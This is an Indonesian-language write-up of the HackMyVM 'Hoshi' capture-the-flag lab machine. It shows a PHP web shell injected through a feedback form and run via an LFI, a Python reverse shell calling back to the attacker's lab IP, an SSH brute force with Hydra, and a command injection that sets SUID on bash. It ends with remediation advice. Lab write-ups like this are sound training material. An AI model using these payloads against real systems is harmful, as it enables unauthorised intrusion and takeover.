---
layout: post
title: "HackMyVm-Hoshi"
date: 2025-11-08 04:15:00 +0700
categories: [HackMyVm, Hard]
tags: [blind-watermark, lfi, log-poisoning, rce, privilege-escalation, linux, web-security]
image:
  path: /assets/img/post/HackMyVm-Hoshi/banner.png
author: HanzXD
---

## Overview

Hoshi adalah mesin CTF tingkat hard dari HackMyVM yang menampilkan berbagai teknik exploitation menarik termasuk blind watermark steganography, Local File Inclusion (LFI), log poisoning, dan command injection untuk privilege escalation.

**Difficulty:** Hard  
**Target IP:** 192.168.56.106

---

## Reconnaissance

### Port Scanning

Memulai dengan scanning menggunakan Nmap untuk mengidentifikasi service yang berjalan:

```bash
sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Result.txt 192.168.56.106
```

**Parameter yang digunakan:**
- `-sC`: Menjalankan NSE scripts default untuk informasi tambahan
- `-sV`: Probe untuk service versions
- `-p-`: Scan semua 65535 TCP ports
- `-vv`: Very verbose output untuk real-time progress
- `-T4`: Aggressive timing untuk scan lebih cepat
- `-oN`: Menyimpan output dalam format normal

**Hasil Scan:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

**Service yang teridentifikasi:**
- **Port 22** - SSH (OpenSSH 8.4p1)
- **Port 80** - HTTP (Apache 2.4.62)

**robots.txt findings:**
- Disallowed entry: `/img/QQ.png`
- HTTP Methods: GET, HEAD, POST, OPTIONS
- Title: 商品反馈 - 星际商城 (Product Feedback - Interstellar Mall)

---

## Web Enumeration

### Initial Web Access

Mengakses website melalui browser pada `http://192.168.56.106`:

![Homepage](/assets/img/post/HackMyVm-Hoshi/ss1.png)

Website menampilkan sebuah e-commerce platform dengan form feedback pelanggan.

### Directory Bruteforcing

Menggunakan Feroxbuster untuk enumerasi direktori dan file:

```bash
feroxbuster -u "http://192.168.56.106/" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-t 100 -d 2 -x xml,txt,zip,php,js
```

**Parameter yang digunakan:**
- `-u`: Target URL
- `-w`: Wordlist untuk common directories/files
- `-t 100`: 100 threads untuk kecepatan
- `-d 2`: Recursion depth 2
- `-x`: Extensions yang akan di-append (xml, txt, zip, php, js)

**Endpoint Menarik yang Ditemukan:**

```
200 GET  /index.php
200 GET  /admin.php
200 GET  /info.php
200 GET  /robots.txt
200 GET  /sitemap.xml
200 GET  /QQ.png
200 GET  /uploads/_20251107180848.txt
200 GET  /uploads/_20251107173628.txt
200 GET  /uploads/feedbacks.json
301 GET  /uploads => /uploads/
```

![Feroxbuster Results](/assets/img/post/HackMyVm-Hoshi/ss2.png)

File `info.php` menampilkan `phpinfo()` yang memberikan informasi detail tentang konfigurasi PHP server.



### Analyzing robots.txt

Memeriksa `robots.txt` untuk mendapatkan hint:

```
http://192.168.56.106/robots.txt
```
![PHP Info](/assets/img/post/HackMyVm-Hoshi/ss3.png)

**Content:**

```
User-agent: *
Disallow: /img/QQ.png

# Note: `Blind` in the storm, yet stars guide through the `water`.
```



Hint ini mengindikasikan penggunaan **blind watermark** technique.

### Analyzing sitemap.xml

![robots.txt hint](/assets/img/post/HackMyVm-Hoshi/ss4.png)

Mengakses `sitemap.xml` dan melakukan view source:

```xml
<!-- 
Admins, please don't use any easily guessable info as passwords.
Simply setting an element to "display:none" is not secure.
Remember to remove debug information completely for security.
-->
```



Pesan ini memberikan hint bahwa admin menggunakan password yang mudah ditebak.

---

## Initial Access Vector

### Finding Admin Panel



Mengakses `admin.php` menampilkan halaman login:
![sitemap.xml hint](/assets/img/post/HackMyVm-Hoshi/ss5.png)


### Password Discovery via OSINT

Berdasarkan hint di `sitemap.xml`, saya mencoba mencari informasi yang mudah ditebak. Ternyata password admin adalah **nomor hotline** yang tertera di halaman beranda!

![Admin Login Panel](/assets/img/post/HackMyVm-Hoshi/ss6.png)



**Kredensial:**
- **Password:** 400-123-4567 (nomor hotline)

> **Catatan:** Saya awalnya mencoba bruteforce menggunakan CeWL dan Burp Suite Intruder, namun nomor ini terpotong karena terpisah oleh tanda strip (-) saat generating wordlist.

![Hotline Number](/assets/img/post/HackMyVm-Hoshi/ss7.png)

**Command CeWL yang digunakan:**
```bash
cewl http://192.168.56.106/ -w wordlist_lowercase_withnumber.txt \
-u https://maze-sec.com -a --lowercase --with-numbers
```

### Admin Dashboard Access

Setelah login berhasil, kita mendapatkan akses ke admin dashboard yang menampilkan feedback dari users dan opsi untuk delete feedback.
![Admin Panel](/assets/img/post/HackMyVm-Hoshi/foto.png)

---

## Blind Watermark Analysis

### Understanding the Hint

Dari `robots.txt`, kita mendapat hint:
> `Blind` in the storm, yet stars guide through the `water`

Ini mengacu pada teknik **Blind Watermark** - sebuah metode steganography untuk menyembunyikan informasi di dalam gambar.

### Extracting Hidden Watermark

**Step 1: Clone BlindWaterMark Tool**

```bash
git clone https://github.com/chishaxie/BlindWaterMark.git
cd BlindWaterMark
```

**Step 2: Download Target Images**

Download dua versi gambar QQ.png:
- `http://192.168.56.106/QQ.png` (gambar asli)
- `https://maze-sec.com/img/QQ.png` (gambar dengan watermark)

**Step 3: Extract Watermark**

```bash
python3 bwmforpy3.py decode QQ-maze.png QQ.png output.png
```

**Output:**
```
image<QQ-maze.png> + image(encoded)<QQ.png> -> watermark<output.png>
[ WARN:0@2.901] global loadsave.cpp:1063 imwrite_ Unsupported depth image for selected encoder is fallbacked to CV_8U.
```

**Hasil ekstraksi:**

![Hidden Watermark](/assets/img/post/HackMyVm-Hoshi/ss8.png)

Watermark menunjukkan direktori tersembunyi: **/hoshi**

---

## Exploiting /hoshi Directory

### Directory Enumeration

Mengakses direktori `/hoshi`:
terdapat directory listing
**Contents:**
- `upload/` - Directory untuk uploaded files
- `gift.php` - File PHP yang mencurigakan

### Discovering LFI Vulnerability

Mengakses `gift.php`:

![gift.php initial](/assets/img/post/HackMyVm-Hoshi/ss10.png)

Response: **"illegal filename"**

sebuah karakteristik umum dari kerentanan LFI (Local File Inclusion)

```
http://192.168.56.106/hoshi/gift.php?file=info.php
```

![LFI Success](/assets/img/post/HackMyVm-Hoshi/ss11.png)

**Berhasil!** File `info.php` berhasil di-include. Namun, mencoba membaca `/etc/passwd` gagal - kemungkinan ada filter.

### LFI to RCE via Log Poisoning

Karena akses langsung ke file system terbatas, kita akan menggunakan teknik **log poisoning** untuk mengubah LFI menjadi RCE.

**Reference:**
- [PHP LFI to RCE - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-to-rce-via-controlled-files)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### Fuzzing for Accessible Files

Menggunakan ffuf untuk menemukan file yang dapat diakses:

```bash
ffuf -u http://192.168.56.106/hoshi/gift.php?file=FUZZ \
-w fuzz.txt -fs 40
```

**Results:**

```
admin.html              [Status: 200, Size: 4489]
admin.php               [Status: 200, Size: 2755]
index.php               [Status: 200, Size: 7965]
info.php                [Status: 200, Size: 86047]
robots.txt              [Status: 200, Size: 194]
```

File **admin.html** menarik karena ini adalah versi HTML dari admin.php!

![admin.html via LFI](/assets/img/post/HackMyVm-Hoshi/ss12.png)

### Poisoning Feedback Form

**Strategy:**
1. Inject PHP code melalui feedback form
2. Feedback disimpan di `admin.html`
3. Include `admin.html` via LFI
4. PHP code ter-execute → RCE!

**Payload:**
```php
<?php system($_GET['cmd']); ?>
```

**Mengirim Payload via Burp Suite:**

```http
POST / HTTP/1.1
Host: 192.168.56.106
Content-Length: 125
Content-Type: application/x-www-form-urlencoded

username=<?php+system($_GET['cmd']);+?>&email=hel@gmail.com&product=demo1&feedback=<?php+system($_GET['cmd']);+?>
```

**URL Encoded:**
```
username=<%3fphp+system($_GET['cmd'])%3b+%3f>&email=hel@gmail.com&product=demo1&feedback=<%3fphp+system($_GET['cmd'])%3b+%3f>
```

### Testing RCE

Testing command execution:

```
http://192.168.56.106/hoshi/gift.php?file=admin.html&cmd=id
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE berhasil!** 🎉

---

## Getting Reverse Shell

### Preparing Payload

**Reverse Shell Payload (Python):**

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.103",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**URL Encoded:**
```
http://192.168.56.106/hoshi/gift.php?file=admin.html&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.103%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

### Setting Up Listener

Menggunakan Penelope untuk auto-upgrade shell:

```bash
penelope -p 4444
```

**Output:**
```
[+] Listening for reverse shells on 0.0.0.0:4444
[+] Got reverse shell from hoshi~192.168.56.106-Linux-x86_64 😍
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
```
![RCE Success](/assets/img/post/HackMyVm-Hoshi/ss14.png)

**Shell Access:**

```bash
www-data@hoshi:/var/www/html/hoshi$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@hoshi:/var/www/html/hoshi$ ls -la /home
drwx------ 2 welcome welcome 4096 Jun 20 13:01 welcome
```

User yang teridentifikasi: **welcome**

---

## Lateral Movement - SSH Bruteforce

### Attempting SSH Access

Karena tidak ada informasi tentang password user `welcome`, kita bruteforce SSH:

```bash
hydra -l welcome -P /usr/share/wordlists/rockyou.txt \
ssh://192.168.56.106 -t 34
```

**Output:**
```
[22][ssh] host: 192.168.56.106   login: welcome   password: loveme2
1 of 1 target successfully completed, 1 valid password found
```

**Kredensial SSH:**
- **Username:** welcome
- **Password:** loveme2

### SSH Access

```bash
ssh welcome@192.168.56.106
```

**Login berhasil:**

```bash
welcome@hoshi:~$ id;whoami
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
welcome
```

### User Flag

```bash
welcome@hoshi:~$ cat user.txt
flag{user-50c96546cc54b4adc381c77a0189b1e7}
```

**User Flag Captured!** 🚩

---

## Privilege Escalation to Root

### Sudo Privileges Enumeration

```bash
welcome@hoshi:~$ sudo -l
User welcome may run the following commands on hoshi:
    (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py
```

User `welcome` dapat menjalankan `/root/12345.py` sebagai root tanpa password!

### Analyzing the Python Script

Menjalankan script:

```bash
welcome@hoshi:~$ sudo /usr/bin/python3 /root/12345.py
Server listening on port 12345...
```


Script membuka socket server pada port 12345. Mari kita connect dan explore.

### Connecting to the Service

```bash
nc 192.168.56.106 12345
```

**Available Commands:**

```
Available commands:
  help         - Show this help message
  ping <host>  - Ping a host
  exec_cmd     - Execute system commands
  exit         - Exit the connection
```

![Service Commands](/assets/img/post/HackMyVm-Hoshi/ss15.png)

Command **exec_cmd** terlihat sangat menjanjikan!

### Command Injection Testing

Testing command injection:

```bash
conf> exec_cmd id
uid=0(root) gid=0(root) groups=0(root)
```

Command berhasil dieksekusi sebagai root! Namun, ada character filtering:

**Filtered Characters:** `|`, `;`, `&`, `<`, `>`  
**Bypass:** Gunakan `&&` untuk command chaining!

### Exploiting for Root Access

**Strategy:** Set SUID bit pada `/bin/bash` menggunakan command injection

```bash
conf> exec_cmd id'&&chmod +s /bin/bash&&'
uid=0(root) gid=0(root) groups=0(root)
```

### Getting Root Shell

```bash
welcome@hoshi:~$ bash -p
bash-5.0# id;whoami
uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
root
```

**ROOT ACCESS ACHIEVED!** 🎉

### Root Flag

```bash
bash-5.0# cd /root
bash-5.0# ls
12345.py  congrats.txt  root.txt

bash-5.0# cat congrats.txt
Congratulations, Hacker!

You've successfully pwned this target machine! 🎉 
Your skills are top-notch, and you've earned ultimate bragging rights.

Keep hacking, keep learning, and check out more challenges at maze-sec.com!
See you in the next challenge!

- Sublarge

bash-5.0# cat root.txt
flag{root-c7d8a66bcc0b7cccaeb44b9524545f45}
```

**Root Flag Captured!** 🚩

---

## Summary

### Flags Captured

- **User Flag:** `flag{user-50c96546cc54b4adc381c77a0189b1e7}`
- **Root Flag:** `flag{root-c7d8a66bcc0b7cccaeb44b9524545f45}`

### Attack Chain

1. **Reconnaissance** - Port scanning mengidentifikasi SSH (22) dan HTTP (80) services
2. **Web Enumeration** - Directory bruteforcing menemukan admin panel dan file menarik
3. **OSINT** - Menemukan password admin dari nomor hotline di homepage
4. **Steganography** - Mengekstrak blind watermark dari `QQ.png` untuk menemukan direktori `/hoshi`
5. **LFI Discovery** - Menemukan Local File Inclusion vulnerability di `gift.php`
6. **Log Poisoning** - Melakukan injection PHP code melalui feedback form
7. **RCE** - Mengeksekusi PHP code via LFI untuk mendapatkan command execution
8. **Reverse Shell** - Mendapatkan reverse shell sebagai `www-data`
9. **SSH Bruteforce** - Bruteforce SSH untuk user `welcome` dengan Hydra
10. **Privilege Escalation** - Exploitasi command injection pada Python script yang berjalan sebagai root
11. **Root Access** - Set SUID bit pada bash dan spawn root shell

### Key Techniques Used

- **Blind Watermark Extraction** - Menggunakan steganography untuk menemukan hidden information
- **LFI to RCE** - Log poisoning via feedback form injection
- **Command Injection** - Bypass character filtering menggunakan `&&`
- **SUID Exploitation** - Set SUID bit untuk privilege escalation

### Key Takeaways

- **OSINT matters** - Informasi sederhana seperti nomor telepon bisa menjadi password
- **Steganography** bukan hanya tentang LSB - blind watermark adalah teknik advanced
- **Log poisoning** efektif ketika direct file access terbatas
- **Command injection** dengan character filtering memerlukan creative bypass
- Selalu check **sudo privileges** untuk privilege escalation vectors
- **Input validation** yang buruk pada privileged scripts sangat berbahaya

---

## Remediation Recommendations

### Web Application Security

1. **Password Policy:**
   - Jangan gunakan informasi public (nomor telepon, tanggal, dll) sebagai password
   - Implementasikan strong password requirements
   - Gunakan password manager

2. **File Inclusion Protection:**
   - Whitelist file yang boleh di-include
   - Validasi dan sanitasi input secara strict
   - Disable PHP functions berbahaya (`system`, `exec`, `passthru`)
   - Gunakan `open_basedir` directive untuk membatasi file access

3. **Input Validation:**
   - Sanitasi semua user input
   - Implementasikan WAF (Web Application Firewall)
   - Never trust user input

### System Security

4. **Sudo Configuration:**
   - Review sudo permissions secara berkala
   - Avoid memberikan sudo access ke scripts yang vulnerable
   - Implementasikan principle of least privilege
   - Use `sudoedit` untuk file editing tasks

5. **Command Execution:**
   - Hindari mengekspos command execution functionality
   - Jika necessary, gunakan command whitelisting
   - Properly escape dan validate semua input
   - Run services dengan minimal required privileges

6. **SSH Hardening:**
   - Disable password authentication, gunakan key-based auth
   - Implementasikan fail2ban untuk bruteforce protection
   - Change default port (security through obscurity)
   - Regular password audits

---

## Tools Used

- **Nmap** - Network scanning dan service detection
- **Feroxbuster** - Directory dan file bruteforcing
- **BlindWaterMark** - Watermark extraction tool
- **Burp Suite** - Web proxy dan request manipulation
- **ffuf** - Web fuzzing untuk LFI testing
- **Hydra** - SSH bruteforce
- **Penelope** - Reverse shell handler dengan auto-upgrade
- **Netcat** - Network connections

---

Thanks for reading! Keep learning and happy hacking! 🚀

**Challenge by:** Sublarge @ [maze-sec.com](https://maze-sec.com)  
**Writeup by:** HanzXD